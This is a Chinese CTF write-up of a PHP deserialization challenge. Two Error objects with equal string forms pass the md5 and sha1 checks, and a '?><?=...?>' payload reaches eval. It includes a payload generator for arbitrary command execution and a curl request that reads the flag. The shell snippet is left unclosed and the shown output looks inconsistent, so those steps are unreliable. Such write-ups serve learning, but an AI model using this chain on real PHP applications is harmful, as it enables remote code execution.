这题源码只有十几行，但三个判断条件互斥得厉害：既要两个值不相等，又要它们的 md5 和 sha1 完全一致，最后还得把其中一个当代码执行。常规手法全被堵死，突破口是 PHP 的内置类 `Error`。

![封面](https://toxic1-sudo.github.io/assets/posts/greatphp/cover.jpg)

## 源码

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}
?>
```

`great` 反序列化 → `__wakeup` → 三道门 → eval。

## 三道门互相打架

- `syc != lover`，要不相等
- `md5() ===` 和 `sha1() ===` 是强比较，哈希必须全等
- `0e` 弱碰撞只对 `==` 有用，这里是 `===`
- 数组能让 md5 返回 NULL，但 syc 还得喂给 eval，数组不能当代码执行

所以数组绕过不行。我第一次就是这么试的，返回空。

## 用 Error 的 __toString

md5、sha1、preg_match、eval 收到对象时会自动调 `__toString`。`Error` 是内置类，自带这个方法。

它转出来的字符串（本机实测）：

```text
Error: 消息内容 in 文件路径:行号
Stack trace:
#0 {main}
```

只有 message、file、line，没有 code。于是：

```php
$a = new Error("MSG", 1);
$b = new Error("MSG", 2);   // 同一行
md5($a) === md5($b)   // true，转出来的串一模一样
sha1($a) === sha1($b) // true
$a != $b              // true，比属性，code 是 1 和 2
```

三个条件同时成立。line 要一样是为了让 `file:line` 一致，但我们是反序列化，file 和 line 直接可控，序列化时写死成同样的就行。

## 正则那关

`preg_match` 也会走 `__toString`，过滤的是整个 `Error: 消息 in ...` 字符串。我实测返回 1，说明它是真生效的。

所以 payload 里不能出现 `<?php`、`(`、`)`、`"`、`'`。

## eval 为什么能跑

eval 拿到的是 Error 转成的完整串：

```text
Error: ?><?=include$_GET[a]?> in xxx.php:6
Stack trace:
#0 {main}
```

PHP 解析的过程（本地复刻验证过）：

1. `Error:` 被当成 goto 标签，无害
2. `?>` 退出 PHP 模式
3. `<?=` 重新进 PHP 并 echo，黑名单只挡 `<?php`，`<?=` 不在里面
4. 尾部 `in xxx.php:6 / Stack trace:` 当普通 HTML 输出

## 命令执行只剩 include

`system('id')` 有括号有引号，直接 die。

反引号能过正则，但实测无回显，服务端把 `shell_exec` 用 disable_functions 关了。

最后能用的只有 `include`：语言结构，不需要括号，也不吃引号。flag 不是 PHP 代码，include 进来就原样当 HTML 输出。

## 复现

工作区里留了 `payload.php`，改一行就能用：

```php
<?php
class SYCLOVER { public $syc; public $lover; }
$cmd = $argv[1];
$msg = '?><?=`' . $cmd . '`?>';
$a = new Error($msg, 1); $b = new Error($msg, 2);   // 必须同一行
$c = new SYCLOVER();
$c->syc = $a; $c->lover = $b;
echo urlencode(serialize($c));
```

读 flag 那版把 `$msg` 换成 `'?><?=include$_GET[a]?>'`，然后：

```bash
P=$(php -r 'class SYCLOVER{public $syc;public $lover;}
$msg="?><?=include$_GET[a]?>";

curl "http://node4.anna.nssnode.cn:29373/?great=$P&a=/flag"
```

回来：

```text
NSSCTF{15b494bc-9857-4bb2-855e-f3058c7816c5}
1 in Command line code:4
```

末尾那个 `1` 是 `echo include ...` 把 include 的返回值也打出来了，正常。

## 复盘

这题的思路值得记下来，因为它展示了一个通用的绕过角度：**当强比较卡住你的时候，看看能不能让两个不同的对象在"转成字符串"这一步变成同一个串。**

`Error` 之所以好用，是因为它的 `__toString` 只输出 message、file、line 三个属性，而 `code` 属性不参与转换——于是"对象不相等"和"字符串相等"可以同时成立。

同类内置类还有 `SoapClient`、`SplFileObject`、`SimpleXMLElement`，各有各的 `__toString` 行为。做反序列化题时，看到 `md5()`、`sha1()`、`preg_match()` 的参数可控，先想这里。
